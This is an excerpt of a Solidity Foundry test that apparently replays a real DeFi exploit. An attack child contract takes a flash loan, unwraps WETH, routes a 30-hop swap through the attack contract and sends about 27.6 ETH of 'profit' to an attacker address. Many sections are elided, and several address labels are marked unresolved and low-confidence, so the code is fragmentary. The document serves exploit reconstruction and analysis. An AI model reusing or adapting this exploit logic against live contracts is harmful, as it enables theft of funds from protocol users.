...
contract AttackTest is Base {
    ...
    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_contract_F482;
    }
    ...
    function _installChildRuntime() internal {
...
contract AttackChild {
    ...
    function _settleEth() internal {
        bytes memory emptyCallData = hex"";
        (bool ok,) = payable(Addresses.attacker_eoa).call{value: 27639653402053937499}(emptyCallData);
        require(ok, "native profit transfer failed");

        if (Addresses.WETH.code.length != 0) {
            IERC20Like(Addresses.WETH).balanceOf(address(this));
        } else {
            console2.log(
                "PoCWarning",
                "skipping missing-code observed typed call",
                "Addresses.WETH = 0x4200000000000000000000000000000000000006 label=unresolved token_symbol=WETH roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low"
            );
        }
    }

    function _flashLoanEntry() internal {
        // Structured gap: storage effects action_0004, action_0007, action_0009, and action_0015
        // are observed handoff facts without trace-backed normal calls, so they are not emulated.
        if (Addresses.WETH.code.length != 0) {
    ...
    function flashCallback3() internal {
        uint256 childWethBalance = 0;
        if (Addresses.WETH.code.length != 0) {
            childWethBalance = IERC20Like(Addresses.WETH).balanceOf(address(this));
        } else {
            console2.log(
                "PoCWarning",
                "skipping missing-code observed typed call",
        ...
        }
        {
            {
                if (Addresses.WETH.code.length != 0) {
                    IWETH(Addresses.WETH).withdraw(childWethBalance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
    ...
    function flashCallback4() internal {
        address[] memory swapPath = new address[](30);
        uint256[] memory swapAmounts = new uint256[](30);
        bool[] memory swapFlags = new bool[](30);
        for (uint256 i = 0; i < 30; i++) {
            swapPath[i] = Addresses.attack_contract_F482;
            swapAmounts[i] = 10;
            swapFlags[i] = true;
        }

        if (Addresses.A_39F36E_1A32.code.length != 0) {
            ...
            .swapExactTokensForETHSupportingFeeOnTransferTokens{value: 13823284250000000000}(
                swapPath, swapAmounts, swapFlags
            );
        } else {
            console2.log(
                "PoCWarning",
                "skipping missing-code observed typed call",
                "Addresses.A_39F36E_1A32 = 0x39f36e2e58f36f7e5c17784847fd07da1fee1a32 label=unresolved roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low"
            );
        }
...
library Addresses {
    ...
    address internal constant A_39F36E_1A32 = 0x39F36e2E58f36F7E5c17784847fd07Da1fEE1a32; // Addresses.A_39F36E_1A32 = 0x39f36e2e58f36f7e5c17784847fd07da1fee1a32 label=unresolved roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    ...
    address internal constant WETH = 0x4200000000000000000000000000000000000006; // Addresses.WETH = 0x4200000000000000000000000000000000000006 label=unresolved token_symbol=WETH roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low
